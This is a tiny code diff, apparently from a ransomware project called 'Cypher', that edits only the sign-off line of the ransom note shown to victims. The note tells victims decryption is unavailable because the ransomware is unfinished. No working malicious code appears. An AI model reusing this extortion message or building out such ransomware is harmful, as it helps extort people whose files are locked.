@@ -158,7 +158,7 @@ def note():
 	As of yet these are not available to you since the Cypher ransomware is still under construction. 
 	We thank you for your patience.
 
-	Have a nice day,
+	Have a nice day, force à toi igo,
 
 	The Cypher Project.""" 	
 	
